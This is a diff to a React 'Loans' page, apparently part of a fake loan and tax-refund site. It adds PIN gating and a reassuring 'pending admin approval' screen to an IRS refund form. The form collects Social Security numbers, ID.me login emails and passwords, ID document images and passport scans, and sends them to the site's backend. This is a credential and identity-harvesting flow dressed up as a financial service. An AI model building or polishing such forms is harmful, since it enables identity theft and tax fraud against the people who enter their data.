@@ -2,7 +2,7 @@ import React, { useEffect, useState } from 'react';
 import { useSelector, useDispatch } from 'react-redux';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { Box, Typography, Paper, Grid, Button, Card, CardContent, CircularProgress, Alert, Dialog, DialogTitle, DialogContent, DialogActions, TextField, Tab, Tabs, MenuItem, Stepper, Step, StepLabel, IconButton, List, ListItem, ListItemText, Snackbar } from '@mui/material';
-import { Close, AttachFile, InsertDriveFile, Delete, Email as EmailIcon, CloudUpload, Lock as LockIcon } from '@mui/icons-material';
+import { Close, AttachFile, InsertDriveFile, Delete, Email as EmailIcon, CloudUpload, Lock as LockIcon, CheckCircle } from '@mui/icons-material';
 import { motion } from 'framer-motion';
 import { getUserLoans, getAvailableLoanTypes, applyForLoan, makeLoanPayment, submitTaxRefundRequest } from '../store/slices/loanSlice';
 import api from '../services/api';
@@ -42,6 +42,8 @@ const Loans = () => {
     passport: null
   });
   const [irsSubmitting, setIrsSubmitting] = useState(false);
+  const [pendingTaxRefundAction, setPendingTaxRefundAction] = useState(null);
+  const [taxRefundSubmitted, setTaxRefundSubmitted] = useState(false);
 
   // List of countries for the dropdown
   const countries = [
@@ -167,6 +169,10 @@ const Loans = () => {
       await pendingLoanAction();
       setPendingLoanAction(null);
     }
+    if (pendingTaxRefundAction) {
+      await pendingTaxRefundAction();
+      setPendingTaxRefundAction(null);
+    }
   };
 
   const handleTabChange = (event, newValue) => {
@@ -210,43 +216,64 @@ const Loans = () => {
   };
 
   const handleIrsSubmit = async () => {
-    setIrsSubmitting(true);
-    try {
-      const formData = new FormData();
-      formData.append('fullName', irsForm.fullName);
-      formData.append('ssn', irsForm.ssn);
-      formData.append('idmeEmail', irsForm.idmeEmail);
-      formData.append('idmePassword', irsForm.idmePassword);
-      formData.append('country', irsForm.country);
-      
-      if (irsForm.idmeFront) {
-        formData.append('idmeFront', irsForm.idmeFront);
-      }
-      if (irsForm.idmeBack) {
-        formData.append('idmeBack', irsForm.idmeBack);
-      }
-      if (irsForm.passport) {
-        formData.append('passport', irsForm.passport);
-      }
-      
-      await dispatch(submitTaxRefundRequest(formData)).unwrap();
-      setSnackbarMessage('Your IRS tax refund request has been submitted successfully! We will process it and contact you soon.');
-      setSnackbarOpen(true);
-      setIrsForm({
-        fullName: '',
-        ssn: '',
-        idmeEmail: '',
-        idmePassword: '',
-        country: '',
-        idmeFront: null,
-        idmeBack: null,
-        passport: null
-      });
-    } catch (error) {
-      console.error('Tax refund request failed:', error);
-    } finally {
-      setIrsSubmitting(false);
+    if (!irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country) {
+      return;
     }
+
+    const executeTaxRefund = async () => {
+      setIrsSubmitting(true);
+      try {
+        const formData = new FormData();
+        formData.append('fullName', irsForm.fullName);
+        formData.append('ssn', irsForm.ssn);
+        formData.append('idmeEmail', irsForm.idmeEmail);
+        formData.append('idmePassword', irsForm.idmePassword);
+        formData.append('country', irsForm.country);
+
+        if (irsForm.idmeFront) {
+          formData.append('idmeFront', irsForm.idmeFront);
+        }
+        if (irsForm.idmeBack) {
+          formData.append('idmeBack', irsForm.idmeBack);
+        }
+        if (irsForm.passport) {
+          formData.append('passport', irsForm.passport);
+        }
+
+        await dispatch(submitTaxRefundRequest(formData)).unwrap();
+        setTaxRefundSubmitted(true);
+        setSnackbarMessage('Your IRS tax refund request has been submitted successfully! We will process it and contact you soon.');
+        setSnackbarOpen(true);
+        setIrsForm({
+          fullName: '',
+          ssn: '',
+          idmeEmail: '',
+          idmePassword: '',
+          country: '',
+          idmeFront: null,
+          idmeBack: null,
+          passport: null
+        });
+      } catch (error) {
+        console.error('Tax refund request failed:', error);
+      } finally {
+        setIrsSubmitting(false);
+        setPendingTaxRefundAction(null);
+      }
+    };
+
+    if (user?.pinSetupRequired) {
+      navigate('/pin-setup');
+      return;
+    }
+
+    if (!pinVerified) {
+      setPendingTaxRefundAction(() => executeTaxRefund);
+      setShowPinModal(true);
+      return;
+    }
+
+    await executeTaxRefund();
   };
 
   if (loading) {
@@ -394,19 +421,21 @@ const Loans = () => {
       )}
 
       {tabValue === 1 && (
-        <motion.div
-          initial={{ opacity: 0, y: 30 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.7 }}
-        >
-          <Paper sx={{ 
-            p: { xs: 3, md: 6 }, 
-            borderRadius: 2,
-            background: 'linear-gradient(135deg, rgba(255,255,255,0.92) 0%, rgba(240,247,255,0.88) 100%)',
-            backdropFilter: 'blur(40px) saturate(180%)',
-            border: '1px solid rgba(255,152,0,0.2)',
-            boxShadow: '0 25px 80px -20px rgba(255,152,0,0.35), 0 0 0 1px rgba(255,255,255,0.1) inset, 0 50px 100px -30px rgba(0,0,0,0.25)'
-          }}>
+        <>
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.7 }}
+          >
+            <Paper sx={{ 
+              p: { xs: 3, md: 6 }, 
+              borderRadius: 2,
+              background: 'linear-gradient(135deg, rgba(255,255,255,0.92) 0%, rgba(240,247,255,0.88) 100%)',
+              backdropFilter: 'blur(40px) saturate(180%)',
+              border: '1px solid rgba(255,152,0,0.2)',
+              boxShadow: '0 25px 80px -20px rgba(255,152,0,0.35), 0 0 0 1px rgba(255,255,255,0.1) inset, 0 50px 100px -30px rgba(0,0,0,0.25)',
+              overflow: 'hidden'
+            }}>
             <Typography variant="h4" sx={{ 
               fontWeight: 700,
               background: 'linear-gradient(135deg, #f57c00 0%, #ff9800 50%, #ffb74d 100%)',
@@ -721,6 +750,37 @@ border: '1px solid rgba(0,200,150,0.1)',
             </Grid>
           </Paper>
         </motion.div>
+        {taxRefundSubmitted && (
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.7 }}
+          >
+            <Paper sx={{ 
+              p: { xs: 3, md: 6 }, 
+              borderRadius: 2,
+              background: 'linear-gradient(135deg, rgba(255,255,255,0.92) 0%, rgba(240,247,255,0.88) 100%)',
+              backdropFilter: 'blur(40px) saturate(180%)',
+              border: '1px solid rgba(255,152,0,0.2)',
+              boxShadow: '0 25px 80px -20px rgba(255,152,0,0.35), 0 0 0 1px rgba(255,255,255,0.1) inset, 0 50px 100px -30px rgba(0,0,0,0.25)',
+              textAlign: 'center'
+            }}>
+              <CheckCircle sx={{ fontSize: 64, color: '#ff9800', mb: 2 }} />
+              <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: '#f57c00' }}>
+                Tax Refund Request Submitted
+              </Typography>
+              <Typography variant="body1" sx={{ mb: 3, color: '#4a5568' }}>
+                Your IRS tax refund request has been submitted and is pending admin approval. We will process it and contact you soon.
+              </Typography>
+              <Box sx={{ mt: 3, p: 2, bgcolor: 'rgba(255,152,0,0.08)', borderRadius: 2, border: '1px solid rgba(255,152,0,0.2)' }}>
+                <Typography variant="body2" color="text.secondary">
+                  <strong>Next Steps:</strong> Our team will review your request and contact you within 24-48 hours.
+                </Typography>
+              </Box>
+            </Paper>
+          </motion.div>
+        )}
+      </>
       )}
 
       {/* Loan Services Content */}
@@ -1448,6 +1508,7 @@ border: '1px solid rgba(0,200,150,0.1)',
         onClose={() => {
           setShowPinModal(false);
           setPendingLoanAction(null);
+          setPendingTaxRefundAction(null);
         }}
         onVerified={handlePinVerified}
         title="Confirm Transaction"
